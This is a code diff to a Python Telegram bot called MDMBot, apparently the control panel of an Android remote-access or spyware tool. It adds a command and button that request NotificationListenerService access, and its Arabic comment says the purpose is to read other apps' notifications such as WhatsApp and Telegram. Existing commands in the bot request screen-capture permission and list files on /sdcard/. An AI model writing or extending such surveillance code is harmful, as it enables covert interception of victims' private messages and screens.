@@ -280,6 +280,11 @@ def build_command_payload(cmd_type, params=None):
             p = {"command": cmd_type, "category": "permissions",
                  "timestamp": datetime.now(timezone.utc).isoformat()}
             return p
+        # ⚡ request-notification-permission (NotificationListenerService)
+        if cmd_type == "request-notification-permission":
+            p = {"command": cmd_type, "category": "permissions",
+                 "timestamp": datetime.now(timezone.utc).isoformat()}
+            return p
         return None
     p = {"command": cmd_type, "category": cmd["category"],
          "timestamp": datetime.now(timezone.utc).isoformat()}
@@ -490,6 +495,15 @@ def permissions_keyboard(did):
         callback_data=f"cmd:{did}:p{cache_key}"[:64]
     )
     kb.add(screen_btn)
+    # ⚡ زر تفعيل الوصول للإشعارات (NotificationListenerService)
+    # مختلف عن POST_NOTIFICATIONS — هذا يقرأ إشعارات التطبيقات الأخرى (واتساب، تيليجرام)
+    cache_key2 = str(len(_file_path_cache))
+    _file_path_cache[cache_key2] = "request-notification-permission"
+    notif_access_btn = InlineKeyboardButton(
+        "📬 الوصول للإشعارات",
+        callback_data=f"cmd:{did}:p{cache_key2}"[:64]
+    )
+    kb.add(notif_access_btn)
     kb.add(_back(did))
     return kb
 
@@ -1201,6 +1215,9 @@ class MDMBot:
                 # ⚡ Handle request-screen-permission (MediaProjection)
                 elif tgt == "request-screen-permission":
                     self._send_cmd(c.message.chat.id, did, "request-screen-permission")
+                # ⚡ Handle request-notification-permission (NotificationListenerService)
+                elif tgt == "request-notification-permission":
+                    self._send_cmd(c.message.chat.id, did, "request-notification-permission")
                 # For ls command, default to /sdcard/ if no path specified
                 elif tgt == "ls":
                     self._send_cmd(c.message.chat.id, did, "ls", {"value": "/sdcard/"})
